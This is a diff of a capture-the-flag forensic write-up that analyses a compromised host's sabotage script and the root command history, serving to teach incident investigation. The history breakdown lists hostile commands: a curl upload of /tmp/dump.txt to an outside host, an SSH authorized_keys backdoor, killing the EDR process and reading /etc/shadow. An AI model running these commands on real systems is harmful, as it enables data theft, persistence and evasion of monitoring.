@@ -31,8 +31,8 @@ I searched its home directory for files or directories associated with the attac
 Found second flag inside and then I examined the contents of the identified file to understand its purpose.
 ```cat /home/socmas/2025/eggstrike.sh```
 <img width="587" height="212" alt="image" src="https://github.com/user-attachments/assets/6fb157e3-2d1b-4b31-8405-b7a869162377" />
-The script steals the wishlist.txt content, deletes the original file, and replaces it with eastmas.txt as an act of sabotage.
 
+The script copy the wishlist.txt content to /tmp/dump.txt, deletes the original file, and replace it with eastmas.txt as an act of sabotage.
 
 I escalated privileges to the root account and reviewed the command history to identify any actions performed after the compromise.
 ```
@@ -40,6 +40,34 @@ sudo su
 history
 ```
 <img width="711" height="292" alt="image" src="https://github.com/user-attachments/assets/45ce8cd2-d078-4285-90a4-80f087c9f856" />
+
+### Command Breakdown from history of root account
+Commands 1-3: Reconnaissance
+whoami - Verify current user
+cd ~ - Navigate to home directory
+ll - List files (checking what's available)
+
+Command 4: Persistence Mechanism
+nano .ssh/authorized_keys - Modified SSH keys for backdoor access
+Allows future login without password
+
+Commands 5-7: Data Exfiltration
+curl --data "@/tmp/dump.txt" - Uploading stolen data from /tmp/dump.txt to files.hopsec.thm/upload
+Second curl to red.hopsec.thm/report (possibly confirmation/beacon)
+Third curl is the last flag
+
+Command 8: Process Termination
+pkill tbfcedr - Kill the EDR (Endpoint Detection and Response) process
+
+Command 9: Credential Harvesting
+cat /etc/shadow - contains encrypted user passwords
+
+Command 10: Network Reconnaissance
+cat /etc/hosts - Map internal network infrastructure for lateral movement
+
+## Side Quest
+
+
 
 
 
